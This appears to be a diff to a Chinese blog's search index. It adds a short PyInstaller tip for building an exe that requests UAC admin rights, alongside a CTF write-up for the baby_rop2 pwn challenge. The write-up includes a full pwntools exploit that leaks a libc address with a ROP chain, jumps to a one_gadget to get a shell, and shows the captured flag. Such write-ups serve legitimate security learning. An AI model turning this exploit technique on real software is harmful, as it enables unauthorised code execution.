@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Pyinstaller打包py文件得到UAC权限]]></title>
+    <url>%2F2021%2F01%2F23%2F19-pyinstaller-get-uac-admin%2F</url>
+    <content type="text"><![CDATA[需要打包的脚本 a.py 首先第一次打包脚本 a.py pyinstaller -F --uac-admin a.py 然后去build目录找a/a.exe.manifest, 将其复制到a.py同级目录下, 再次运行 pyinstall -F --uac-admin -r a.exe.manifest,1 a.py 也就是在第一次打包基础上增加-r a.exe.manifest,1, 然后查看dist目录, 发现就是带有UAC的exe了。 参考资料: https://blog.csdn.net/qq_26373925/article/details/105373124]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+        <tag>uac</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[【CTF-PWN】ROP + One_gadget拿shell]]></title>
     <url>%2F2020%2F06%2F20%2F18-buuoj-babyrop2%2F</url>
     <content type="text"><![CDATA[记录一下在题目中one_gadget的使用, one_gadget永远滴神. 0x01 题目地址https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2 0x02 开始梭哈题目给了一个babyrop2和一个libc.so.6, 先分析一下这个babyrop2. babyrop2程序就一个输入点 打算使用printf函数泄露出__libc_start_main的地址. (确实没有找到合适泄露的函数, 只能这个了…) 也就是要构造一个printf(&quot;%s&quot;, __libc_start_main的got地址)先找到%s 截取到%s开始, 也就是 __libc_start_main的got就不用多说了. 接下来从libc.so.6里面得到一些信息 libc.so.6我们要从这个文件中得到one_gadget, 需要借助一个工具, 就叫one_gadget. one_gadget是什么呢? 就是我们以往做ROP需要泄露地址然后拿到真实的system函数以及bin_sh字符串的地址构造ROP, 但是当有了one_gadget, 就可以直接返回到这个地址拿到shell. 0x03 expfrom pwn import * p = process("./babyrop2") # p = remote("node3.buuoj.cn", 29305) elf = ELF("./babyrop2") libc = elf.libc # var overflow = 0x20 + 8 format_string = 0x400790 pop_rdi = 0x0000000000400733 pop_rsi_r15 = 0x0000000000400731 printf_plt = elf.plt["printf"] libc_start_main_got = elf.got["__libc_start_main"] main_addr = elf.sym["main"] payload = "A" * overflow payload += p64(pop_rdi) + p64(format_string) payload += p64(pop_rsi_r15) + p64(libc_start_main_got) + p64(0) payload += p64(printf_plt) + p64(main_addr) p.sendline(payload) leak_addr = u64(p.recvuntil("\x7f")[-6:].ljust(8, "\0")) success("libc_start_main: {}".format(hex(leak_addr))) libc_base = leak_addr - libc.sym["__libc_start_main"] payload = "A" * overflow payload += p64(libc_base + 0x45216) p.sendline(payload) p.interactive() emm, 这题目flag竟然没放到根目录, 还要找一下才可以QAQ flag{23d424ad-f38b-4a47-a60f-41ca5c19fb88}]]></content>
